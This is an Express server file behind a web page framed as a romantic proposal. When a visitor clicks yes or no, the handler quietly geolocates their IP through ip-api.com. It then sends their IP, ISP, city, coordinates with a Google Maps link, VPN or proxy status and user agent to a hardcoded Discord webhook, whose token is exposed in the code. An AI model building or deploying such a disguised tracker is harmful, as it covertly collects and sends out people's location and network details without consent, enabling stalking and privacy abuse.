import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API route for the proposal response
  app.post("/api/propose", async (req, res) => {
    const { choice } = req.body;
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    
    // If it's a comma-separated list (common with proxies), take the first one
    if (typeof ip === 'string' && ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }

    const webhookUrl = "https://discord.com/api/webhooks/1485100117504688322/nUfW1cG8NtssDxDPMrlTf707WRw5dVW9vhCZHGoRohkQqW63XkKI0SRyC7MpocRnTX9d";

    try {
      // Fetch IP details with more fields
      let ipDetails: any = { city: "Unknown", regionName: "Unknown", country: "Unknown", isp: "Unknown", query: ip, lat: 0, lon: 0, timezone: "Unknown", proxy: false, mobile: false };
      try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
        if (geoRes.ok) {
          const data = await geoRes.json();
          if (data.status === 'success') {
            ipDetails = data;
          }
        }
      } catch (e) {
        console.error("IP Geolocation failed:", e);
      }

      const mapsUrl = ipDetails.lat && ipDetails.lon 
        ? `https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon}` 
        : "N/A";

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          embeds: [
            {
              title: choice === "yes" ? "💖 SHE SAID YES! 💖" : "💔 Response Received",
              color: choice === "yes" ? 0xff0055 : 0x333333,
              description: choice === "yes" 
                ? "Congratulations! You've got a girlfriend now! 🥂" 
                : "She didn't say yes this time...",
              fields: [
                {
                  name: "📍 Location",
                  value: `${ipDetails.city}, ${ipDetails.regionName}, ${ipDetails.country}\n[View on Google Maps](${mapsUrl})`,
                  inline: true,
                },
                {
                  name: "🕒 Timezone",
                  value: `\`${ipDetails.timezone}\``,
                  inline: true,
                },
                {
                  name: "🌐 IP & ISP",
                  value: `IP: \`${ipDetails.query}\`\nISP: \`${ipDetails.isp}\``,
                  inline: false,
                },
                {
                  name: "🛡️ Security",
                  value: `Proxy/VPN: \`${ipDetails.proxy ? 'YES' : 'NO'}\`\nMobile: \`${ipDetails.mobile ? 'YES' : 'NO'}\`\nHosting: \`${ipDetails.hosting ? 'YES' : 'NO'}\``,
                  inline: true,
                },
                {
                  name: "📱 User Agent",
                  value: `\`${req.headers['user-agent'] || 'Unknown'}\``,
                  inline: false,
                }
              ],
              footer: {
                text: "Proposal System • " + new Date().toLocaleString()
              },
              thumbnail: {
                url: choice === "yes" 
                  ? "https://mc-heads.net/avatar/its%20coliste/100" 
                  : "https://mc-heads.net/avatar/steve/100"
              }
            },
          ],
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send to webhook");
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Webhook error:", error);
      res.status(500).json({ error: "Failed to process response" });
    }
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
